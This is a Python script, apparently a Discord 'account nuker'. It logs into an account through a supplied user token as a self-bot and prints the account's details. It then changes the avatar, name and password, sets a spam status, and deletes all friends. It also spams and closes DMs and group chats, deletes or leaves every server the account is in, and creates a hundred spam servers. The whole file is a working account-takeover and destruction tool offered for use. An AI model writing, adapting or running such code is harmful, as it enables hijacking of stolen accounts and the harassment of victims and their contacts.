import sys
import colorama
from colorama import Fore
import os
import discord
from discord.ext import commands
import aiohttp
import asyncio
import warnings
import json


warnings.warn = lambda *args, **kwargs: None  # To remove deprecation warnings
colorama.init()


def pad_to_center(l: list, w: int) -> str:
    return '\n'.join([' ' * (w // 2 - (len(max(l, key=len)) // 2)) + x for x in l])


def print_discord():
    text = f'''{Fore.CYAN}
          .///////.           ////////
       ///////////////////////////////////
      //////////////////////////////////////*
    /////////////////////////////////////////
   ///////////////////////////////////////////
  /////////////////////////////////////////////
 ////////////      //////////,     ,///////////,
 ///////////        .///////         ///////////
////////////        ,///////         ///////////.
/////////////*     ///////////     //////////////
/////////////////////////////////////////////////
/////////////////////////////////////////////////
 ,///////////    ///////////////    ///////////
   .////////.                       /////////{Fore.WHITE}'''

    width = os.get_terminal_size().columns
    print(pad_to_center(text.splitlines(), width))


def print_title():
    text = f'''{Fore.CYAN}
░█████╗░██████╗░░█████╗░███╗░░░███╗██╗░██████╗  ░█████╗░░█████╗░░█████╗░░█████╗░██╗░░░██╗███╗░░██╗████████╗
██╔══██╗██╔══██╗██╔══██╗████╗░████║╚█║██╔════╝  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░░░██║████╗░██║╚══██╔══╝
███████║██║░░██║███████║██╔████╔██║░╚╝╚█████╗░  ███████║██║░░╚═╝██║░░╚═╝██║░░██║██║░░░██║██╔██╗██║░░░██║░░░
██╔══██║██║░░██║██╔══██║██║╚██╔╝██║░░░░╚═══██╗  ██╔══██║██║░░██╗██║░░██╗██║░░██║██║░░░██║██║╚████║░░░██║░░░
██║░░██║██████╔╝██║░░██║██║░╚═╝░██║░░░██████╔╝  ██║░░██║╚█████╔╝╚█████╔╝╚█████╔╝╚██████╔╝██║░╚███║░░░██║░░░
╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░╚═════╝░  ╚═╝░░╚═╝░╚════╝░░╚════╝░░╚════╝░░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░

███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
{Fore.WHITE}'''.replace('░', ' ')

    width = os.get_terminal_size().columns
    print(pad_to_center(text.splitlines(), width))


print_discord()
print_title()

if 'config.json' not in os.listdir():
    print(f'{Fore.RED}Config file not found. Exiting...{Fore.WHITE}')
    input()
    sys.exit(1)


def get_config() -> dict:
    with open('config.json') as f:
        return json.load(f)


class AccountNuker(commands.Bot):
    def __init__(self, token, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token

    def get_headers(self):
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.285',
            'Authorization': self.token
        }
        return headers

    def format_message(self, first_color: Fore, *args):
        formatted_message = f"[{first_color}{args[0]}{Fore.WHITE}]"

        for arg in args[1:]:
            formatted_message += f' - [{Fore.YELLOW}{arg}{Fore.WHITE}]'

        print(formatted_message)

    async def nuke(self):
        config = get_config()
        message_to_spam = config["MESSAGE_TO_SPAM"]

        avatar = config["NEW_AVATAR"]
        new_name = config["NEW_NAME"]
        password = config["PASSWORD"]
        if avatar:
            with open(avatar, 'rb') as f:
                avatar = f.read()

        if password and new_name:
            try:
                await self.user.edit(avatar=avatar, username=new_name, house=None, password=password)
            except:
                self.format_message(Fore.RED, 'Password is Invalid.')

        payload = {"theme": "light", "status": "online", "custom_status": {"text": message_to_spam}, 'locale': 'ja'}
        async with aiohttp.ClientSession() as session:
            await session.patch('https://discord.com/api/v8/users/@me/settings', json=payload, headers=self.get_headers())
            country_request = await session.get('https://discord.com/api/v8/auth/location-metadata')
            country = await country_request.json()

        self.format_message(Fore.GREEN, "Changed Theme, Status, Language and Custom Status.")
        self.format_message(Fore.GREEN, "Found Country Code.", country["country_code"])

        for friend in self.user.friends:
            await friend.remove_friend()  # doesnt block the user to make it harder to add friends back.

            self.format_message(Fore.GREEN, 'Removed Friend', friend, friend.id)

        for channel in self.private_channels:
            if isinstance(channel, discord.DMChannel):
                try:
                    await channel.send(message_to_spam)
                except:
                    pass

                await self.http.leave_group(channel.id)

                self.format_message(Fore.GREEN, 'Closed DM Channel.', channel.recipient, channel.id)

            elif isinstance(channel, discord.GroupChannel):
                await channel.send(message_to_spam)
                await channel.leave()

                self.format_message(Fore.GREEN, 'Left Group Channel.', channel.name, channel.id)

        for guild in self.guilds:
            await guild.delete() if guild.owner == self.user else await guild.leave()

            self.format_message(Fore.GREEN, 'Left/Deleted Guild.', guild.name, guild.id, guild.member_count)

        for i in range(100):
            guild = await self.create_guild(name=message_to_spam, icon=avatar)

            self.format_message(Fore.GREEN, 'Created Guild.', guild.name, guild.id)

    async def on_ready(self):
        async with aiohttp.ClientSession() as session:
            info_request = await session.get('https://discord.com/api/v8/users/@me', headers=self.get_headers())
            blacklisted_info = ['public_flags', 'flags', 'banner', 'banner_color']

        info = await info_request.json()
        for key in info:
            if key not in blacklisted_info:
                self.format_message(Fore.CYAN, key, info[key])

        input('PRESS ENTER TO NUKE.')
        print('Nuking...')

        await self.nuke()

    async def run(self):
        await super().start(self.token, bot=False)


print(f"{Fore.CYAN}Please enter a discord token.{Fore.WHITE}")
token = input('[USER] --> ')

bot = AccountNuker(token=token, command_prefix="<<<", self_bot=True, help_command=None)


if __name__ == '__main__':
    loop = asyncio.get_event_loop()

    loop.create_task(bot.run())

    loop.run_forever()
